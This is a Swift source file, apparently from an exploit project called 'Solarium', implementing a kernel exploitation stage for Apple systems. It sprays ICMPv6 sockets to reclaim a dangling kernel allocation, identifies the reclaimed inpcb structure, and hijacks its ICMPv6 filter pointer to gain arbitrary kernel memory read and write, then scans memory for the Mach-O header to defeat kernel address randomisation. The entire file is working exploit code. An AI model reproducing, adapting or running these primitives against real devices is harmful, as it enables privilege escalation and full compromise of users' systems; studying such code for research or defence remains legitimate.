//
//  eSocket.swift
//  Solarium
//
//  Created by Kien Ho on 11/6/26.
//

import Foundation
import Darwin

class eSocket {
    var socketFD: Int32 = 0
    var inpcbAddr: vm_address_t = 0
    
    var textPtr: UInt64 = 0
    var stashedAddr: UInt64 = 0
    var virtBase: UInt64 = 0
    
    let start: vm_address_t
    let count: Int
    let fp: freePages
    
    init?(count: Int) {
        self.fp = freePages(count: count)!
        self.start = fp.getBase()
        self.count = count
        guard fp.grabFreePages() == true else {
            return nil
        }
        guard spraySockets() == true else {
            return nil
        }
    }
    
    private func findPattern(at ptr: vm_address_t, length: Int, byte: UInt8) -> vm_address_t? {
        let base = UnsafeRawPointer(bitPattern: UInt(ptr))!
        for i in 0..<length {
            if base.load(fromByteOffset: i, as: UInt8.self) == byte {
                return ptr + vm_address_t(i)
            }
        }
        return nil
    }
    
    private func scanCandidates(ttl: UInt8, out: inout [vm_address_t]) {
        for j in (count / 5)..<count {
            var cursor = start + pages(j)
            while cursor < start + pages(j + 1) {
                guard let hit = findPattern(at: cursor, length: Int(start + pages(j + 1) - cursor), byte: ttl) else {
                    break
                }
                let inpcb = hit - vm_address_t(kstruct.inpcb.inp6_hops)
                let filt = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
                if filt != 0 && (filt >> 48) == 0xffff {
                    out.append(inpcb)
                }
                cursor = hit + vm_address_t(kstruct.inpcb.size)
            }
        }
    }
    
    private func matchSocket(sockets: inout [Int32], candidates: [vm_address_t]) -> (Int32, vm_address_t)? {
        var newT = 0x3b
        var oldT = 0xf7
        while let fd = sockets.popLast() {
            let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &newT, socklen_t(MemoryLayout<Int32>.size))
            if kr != KERN_SUCCESS {
                print("[eSocket] setsockopt() failed.")
                sockets.removeLast()
                continue
            }

            var matched: vm_address_t = 0
            for inpcb in candidates {
                let cur = UnsafeRawPointer(bitPattern: UInt(inpcb + vm_address_t(kstruct.inpcb.inp6_hops)))!.load(as: UInt8.self)
                if cur == UInt8(truncatingIfNeeded: newT) {
                    matched = inpcb
                    break
                }
            }
            setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &oldT, socklen_t(MemoryLayout<Int32>.size))

            if matched != 0 {
                sockets.removeLast()
                return (fd, matched)
            }
        }
        return nil
    }
    
    private func spraySockets() -> Bool{
        var socketFDs: [Int32] = []
        var inpcb: [vm_address_t] = []
        var ttl: Int32 = 0xf7
        
        defer {
            for fd in socketFDs { close(fd) }
        }
        
        for _ in 0..<3000 {
            let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
            if fd < 0 {
                print("[eSocket] socket() failed.")
                return false
            }
            let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
            if kr != 0 {
                print("[eSocket] setsockopt() failed.")
                close(fd)
                return false
            }
            socketFDs.append(fd)
        }
        print("[eSocket] Sprayed 3000 sockets.")
        for _ in 0..<5 {
            for _ in 0..<500 {
                let fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6)
                if fd < 0 {
                    print("[eSocket] socket() failed.")
                    return false
                }
                let kr = setsockopt(fd, IPPROTO_IPV6, IPV6_UNICAST_HOPS, &ttl, socklen_t(MemoryLayout<Int32>.size))
                if kr != 0 {
                    print("[eSocket] setsockopt() failed.")
                    close(fd)
                    return false
                }
                socketFDs.append(fd)
            }

            print("[eSocket] Finding matches.")
            scanCandidates(ttl: UInt8(ttl), out: &inpcb)

            print("[eSocket] Confirming matches.")
            if let (fd, inpcb) = matchSocket(sockets: &socketFDs, candidates: inpcb) {
                socketFD = fd
                inpcbAddr = inpcb
                print("[eSocket] Dangling allocation 0x\(String(inpcb, radix: 16)) reallocated as the inpcb for socket \(fd).")
                if(!fp.markUsed(page: inpcb)) {
                    print("[eSocket] Fail to mark reclaimed page as used.")
                    return false
                }
                if(!fp.clearUnused()) {
                    print("[eSocket] Fail to deallocate unused pages.")
                    return false
                }
                textPtr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
                return true
            }
            print("[eSocket] Object not found, retrying.")
        }
        return false
    }
    
    private func stashAddress() {
        if(stashedAddr != 0) {
            print("[eSocket] Unknown error stashing address.")
        }
        stashedAddr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!.loadUnaligned(as: UInt64.self)
    }
    
    private func setAddress(address: UInt64) {
        if(stashedAddr == 0) {
            stashAddress()
        }
        let ptr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!
        ptr.storeBytes(of: UInt64(address), as: UInt64.self)
    }
    
    func restoreObjectState() {
        let ptr = UnsafeMutableRawPointer(bitPattern: UInt(inpcbAddr + vm_address_t(kstruct.inpcb.inp6_icmp6filt)))!
        ptr.storeBytes(of: UInt64(stashedAddr), as: UInt64.self)
        stashedAddr = 0
    }
    
    func getPointer() -> UInt64 {
        return textPtr
    }
    
    func get32B(address: UInt64) -> icmp6_filter? {
        setAddress(address: address)
        defer {
            restoreObjectState()
        }
        var outbuf = icmp6_filter()
        var len = socklen_t(MemoryLayout<icmp6_filter>.size)
        let kr = getsockopt(socketFD, IPPROTO_ICMPV6, ICMP6_FILTER, &outbuf, &len)
        if kr != 0 {
            print("[eSocket] getsockopt() failed.")
            return nil
        }
        return outbuf
    }
    
    func set32B(address: UInt64, bytes: icmp6_filter) -> Bool {
        setAddress(address: address)
        defer {
            restoreObjectState()
        }
        var inbuf = bytes
        let kr = setsockopt(socketFD, IPPROTO_IPV6, ICMP6_FILTER, &inbuf, socklen_t(MemoryLayout<icmp6_filter>.size))
        if kr != KERN_SUCCESS {
            print("[eSocket] setsockopt() failed.")
            return false
        }
        return true
    }
    
    private func findBase() -> Bool {
        var readAddr = (textPtr & ~0x3fff) - 0x4400000
        while true {
            guard let out = get32B(address: readAddr) else {
                return false
            }
            if out.icmp6_filt.0 == 0xfeedfacf {
                virtBase = readAddr
                return true
            }
            readAddr -= 0x4000
        }
    }
    
    func getBase() -> UInt64 {
        if(virtBase == 0 && findBase() == false) {
            print("[eSocket] Unable to find kernel base.")
        }
        return virtBase
    }
}
